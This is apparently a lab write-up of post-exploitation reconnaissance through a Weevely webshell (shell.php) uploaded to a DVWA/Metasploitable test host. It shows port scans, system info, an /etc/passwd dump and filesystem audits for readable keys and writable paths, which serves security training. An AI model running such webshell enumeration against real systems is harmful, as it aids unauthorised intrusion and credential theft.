---
author(s):
  - Userware
tags:
  - webshell
  - interactive-shell
  - post-exploitation
  - enumeration-and-discovery
  - weevely
---
# 03 - Internal Reconnaissance

## 3.1 - Port Scan

```
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ net_scan -h
The remote script execution triggers an error 500, check script and payload integrity
usage: net_scan [-h] [-timeout TIMEOUT] [-print] addresses ports

TCP Port scan.

positional arguments:
  addresses         IPs or interface e.g. 10.1.1.1,10.1.1.2 or 10.1.1.1-254 or 10.1.1.1/255.255.255.0 or eth0
  ports             Ports e.g. 80,8080 or 80,8080-9090

optional arguments:
  -h, --help        show this help message and exit
  -timeout TIMEOUT  Connection timeout
  -print            Print closed and filtered ports
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ net_scan 172.28.128.8 21-25,53,80-1024
The remote script execution triggers an error 500, check script and payload integrity
Scanning addresses 172.28.128.8-172.28.128.8:21-25
Scanning addresses 172.28.128.8-172.28.128.8:53-83
Scanning addresses 172.28.128.8-172.28.128.8:84-88
Scanning addresses 172.28.128.8-172.28.128.8:89-93
Scanning addresses 172.28.128.8-172.28.128.8:94-98
Scanning addresses 172.28.128.8-172.28.128.8:99-103
Scanning addresses 172.28.128.8-172.28.128.8:104-108
..[omitted]..
Scanning addresses 172.28.128.8-172.28.128.8:1004-1008
Scanning addresses 172.28.128.8-172.28.128.8:1009-1013
Scanning addresses 172.28.128.8-172.28.128.8:1014-1018
Scanning addresses 172.28.128.8-172.28.128.8:1019-1023
Scanning addresses 172.28.128.8-172.28.128.8:1024-1024
+------------------+
| 172.28.128.8:21  |
| 172.28.128.8:22  |
| 172.28.128.8:23  |
| 172.28.128.8:25  |
| 172.28.128.8:53  |
| 172.28.128.8:80  |
| 172.28.128.8:111 |
| 172.28.128.8:139 |
| 172.28.128.8:445 |
| 172.28.128.8:512 |
| 172.28.128.8:513 |
| 172.28.128.8:514 |
+------------------+
```

## 3.2 - System

```
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ system_info
The remote script execution triggers an error 500, check script and payload integrity
The remote script execution triggers an error 500, check script and payload integrity
+--------------------+--------------------------------------------------------------------------------+
| document_root      | /var/www/                                                                      |
| whoami             | www-data                                                                       |
| hostname           |                                                                                |
| pwd                | /var/www/dvwa/vulnerabilities                                                  |
| open_basedir       |                                                                                |
| safe_mode          | False                                                                          |
| script             | /dvwa/hackable/uploads/shell.php                                               |
| script_folder      | /var/www/dvwa/hackable/uploads                                                 |
| uname              | Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 |
| os                 | Linux                                                                          |
| client_ip          | 172.28.128.14                                                                  |
| max_execution_time | 30                                                                             |
| php_self           | /dvwa/hackable/uploads/shell.php                                               |
| dir_sep            | /                                                                              |
| php_version        | 5.2.4-2ubuntu5.10                                                              |
+--------------------+--------------------------------------------------------------------------------+
```

## 3.3 - Usernames

```
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ audit_etcpasswd
The remote script execution triggers an error 500, check script and payload integrity
root:x:0:0:root:/root:/bin/bash
..[omitted]..
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
```

## 3.4 - Network

```
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ net_ifconfig
The remote script execution triggers an error 500, check script and payload integrity
+------+-----------------+
| eth0 | 172.28.128.8/24 |
| lo   | 127.0.0.1/8     |
+------+-----------------+
```

## 3.5 - SUID and SGID

```
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ audit_suidsgid
```

## 3.6 - Audit Filesystem

```
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ audit_filesystem
The remote script execution triggers an error 500, check script and payload integrity
Search executable files in /home/ folder
/home/
/home/service
/home/ftp
/home/user
/home/msfadmin
Search writable files in /home/ folder
Search certain readable files in etc folder
/etc/apparmor.d/abstractions/ssl_keys
/etc/X11/fluxbox/keys
/etc/X11/xkb/compat/mousekeys
/etc/X11/xkb/types/mousekeys
Search certain readable log files
/var/log/dpkg.log
/var/log/wtmp
/var/log/udev
/var/log/boot
/var/log/lastlog
Search writable files in /var/spool/cron/ folder
Search writable files in binary folders
/lib/udev/devices/stderr
/lib/udev/devices/fd
/lib/udev/devices/stdin
/lib/udev/devices/stdout
/lib/udev/devices/fd/0
/lib/udev/devices/fd/1
/lib/udev/devices/fd/2
/lib/udev/devices/fd/3
Search writable files in etc folder
Search writable files in / folder
/tmp
```

## 3.7 - PHP Config

```
www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ audit_phpconf
```

:file_grep                    Print lines matching a pattern in multiple files.
:file_enum                    Check existence and permissions of a list of paths.
:system_procs                 List running processes.